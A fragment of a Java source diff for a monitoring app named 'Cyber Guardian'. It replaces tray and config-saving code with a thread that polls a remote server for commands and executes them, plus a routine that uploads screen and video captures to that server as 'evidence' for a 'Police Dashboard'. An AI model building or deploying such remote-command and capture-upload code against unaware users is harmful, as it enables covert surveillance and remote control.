-            exitItem.addActionListener(e -> System.exit(0));
-            popup.add(exitItem);
-            trayIcon = new TrayIcon(image, "Cyber Guardian", popup);
-            trayIcon.setImageAutoSize(true);
-            tray.add(trayIcon);
-        } catch (Exception e) {
-            System.err.println("❌ [DEBUG] System Tray Error: " + e.getMessage());
-        }
+            } catch (Exception e) { e.printStackTrace(); }
+        }).start();
     }
 
-    private static void saveConfigToFile() {
-        try {
-            JSONObject config = new JSONObject();
-            config.put("botToken", botToken);
-            config.put("chatId", chatId);
-            config.put("masterPassword", masterPassword);
-            config.put("scanInterval", scanInterval);
-            
-            JSONArray bl = new JSONArray();
-            for (String p : blacklist) bl.put(p);
-            config.put("blacklist", bl);
+    private static void startServerPolling() {
+        new Thread(() -> {
+            log("📡 [AGENT] Server Polling Started. URL: " + SERVER_URL);
+            while (true) {
+                try {
+                    String pollUrl = SERVER_URL + "/api/commands/poll?apiKey=" + API_KEY + "&targetId=" + java.net.URLEncoder.encode(TARGET_ID, java.nio.charset.StandardCharsets.UTF_8.toString());
+                    HttpRequest request = HttpRequest.newBuilder().uri(URI.create(pollUrl)).header("ngrok-skip-browser-warning", "1").GET().build();
+                    HttpResponse<String> response = httpClient.send(request, HttpResponse.BodyHandlers.ofString());
+                    if (response.statusCode() == 200) {
+                        JSONObject json = new JSONObject(response.body());
+                        String cmd = json.getString("command");
+                        
+                        if (!cmd.equals("NONE")) {
+                            log("📬 [SERVER] Received Remote Command: " + cmd);
+                            handleRemoteCommand("/" + cmd.toLowerCase());
+                        }
+                    } else {
+                        log("⚠️ [AGENT] Server Polling Error: " + response.statusCode());
+                    }
+                } catch (Exception e) { 
+                    log("❌ [AGENT] Server Polling Failed: " + e.getMessage());
+                }
+                try { Thread.sleep(5000); } catch (Exception ignored) {}
+            }
+        }).start();
+    }
 
-            Files.write(Paths.get("config.json"), config.toString(4).getBytes(StandardCharsets.UTF_8));
-        } catch (Exception e) {
-            System.err.println("❌ [DEBUG] Failed to save config: " + e.getMessage());
-        }
+    private static void uploadToServer(java.io.File file) {
+        new Thread(() -> {
+            try {
+                if (!file.exists()) return;
+                String boundary = "Boundary" + System.currentTimeMillis();
+                String contentType = file.getName().endsWith(".mp4") ? "video/mp4" : "image/jpeg";
+                HttpRequest request = HttpRequest.newBuilder()
+                        .uri(URI.create(SERVER_URL + "/api/upload?targetId=" + TARGET_ID))
+                        .header("Content-Type", "multipart/form-data; boundary=" + boundary)
+                        .POST(buildMultipartBodyForServer(file, boundary, contentType))
+                        .header("ngrok-skip-browser-warning", "1")
+                    .build();
+                httpClient.send(request, HttpResponse.BodyHandlers.ofString());
+                
+                // Add a log for the Police Dashboard
+                String action = file.getName().endsWith(".mp4") ? "VIDEO_CAPTURE" : "SCREENSHOT_CAPTURE";
+                securityService.addLog("KOCKROACH", action, "Evidence uploaded from " + System.getProperty("user.name"), file.getName(), TARGET_ID);
+            } catch (Exception e) { e.printStackTrace(); }
+        }).start();
+    }
+
+    private static HttpRequest.BodyPublisher buildMultipartBodyForServer(java.io.File file, String boundary, String contentType) throws IOException {
+        byte[] fileBytes = Files.readAllBytes(file.toPath());
+        java.io.ByteArrayOutputStream bs = new java.io.ByteArrayOutputStream();
+        bs.write(("--" + boundary + "\r\n").getBytes());
+        bs.write(("Content-Disposition: form-data; name=\"file\"; filename=\"" + file.getName() + "\"\r\n").getBytes());
+        bs.write(("Content-Type: " + contentType + "\r\n\r\n").getBytes());
+        bs.write(fileBytes);
+        bs.write(("\r\n--" + boundary + "--\r\n").getBytes());
+        return HttpRequest.BodyPublishers.ofByteArray(bs.toByteArray());
     }
 }
